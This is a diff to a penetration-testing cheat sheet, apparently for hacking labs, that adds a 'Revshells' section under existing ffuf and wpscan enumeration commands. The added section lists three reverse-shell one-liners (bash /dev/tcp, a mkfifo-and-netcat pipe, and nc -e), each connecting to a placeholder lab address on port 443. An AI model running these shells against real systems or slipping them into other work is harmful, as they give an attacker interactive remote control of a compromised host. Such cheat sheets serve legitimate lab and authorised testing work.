@@ -47,6 +47,13 @@ ffuf -w /Seclists -u https://$ip/$file.php?$param=FUZZ -fc 401
 wpscan --url http://$ip | tee wpscanshallow
 wpscan --url http://$ip -e u,vp,vt | tee wpscandeep
 ```
+
+### Revshells
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.X/443 0>&1'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 443 >/tmp/f
+nc -e /bin/bash 10.10.14.X 443
+```
 ## Active Directory
 
 ### God-potato
